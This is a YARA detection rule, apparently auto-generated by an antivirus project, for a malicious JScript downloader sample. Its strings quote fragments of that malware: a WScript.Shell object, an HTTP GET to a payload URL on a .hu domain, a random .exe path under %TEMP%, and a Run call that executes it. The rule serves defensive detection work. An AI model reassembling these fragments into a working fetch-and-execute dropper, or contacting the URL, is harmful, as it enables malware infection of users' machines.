rule sig_20160330_ec9018026c27482b38cad700573bdf09 {
  meta:
    description = "datamaliciousorder - file 20160330_ec9018026c27482b38cad700573bdf09.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3f6b2a8b7458cdacae6863f34d057e0589358b5ecf5d3ab1ad6457ce87665d43"

  strings:
    $s1  = "var ZQ = function U() {return WScript[TO](\"WScript\"+\".Shell\");}(), XD = 11;" fullword ascii
    $s2  = "function G(C0, OY){C = C * 1; return C0 - OY;};" fullword ascii
    $s3  = "E1[U0](\"GET\", \"http://vidamparty.hu/as0ldr\", false);" fullword ascii
    $s4  = "if (E1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZX() {return ZQ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"JexP1lsls8bNrgO.ex\" + \"e\";};" fullword ascii
    $s6  = "function O(){return X + \"\";};" fullword ascii
    $s7  = "function E() {return ((V0 == true) && (V0 == Z)) ? 1 : C;};" fullword ascii
    $s8  = "function F(V){ZQ[\"Run\"](V, C, C);};" fullword ascii
    $s9  = "function D(){return 22;};" fullword ascii
    $s10 = "}while (D0);" fullword ascii
    $s11 = "function LP(E0) {var I = (1, 2, 3, 4, 5, E0); return I;};" fullword ascii
    $s12 = "return G(CF, JI);" fullword ascii
    $s13 = "function LO(){return TO;};" fullword ascii
    $s14 = "function SM()" fullword ascii
    $s15 = "var CG = new this[\"Date\"]();" fullword ascii
    $s16 = "Z = true; " fullword ascii
    $s17 = "var Z = false;" fullword ascii
    $s18 = "var V1 = false;" fullword ascii
    $s19 = "var V0 = false;" fullword ascii
    $s20 = "V0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}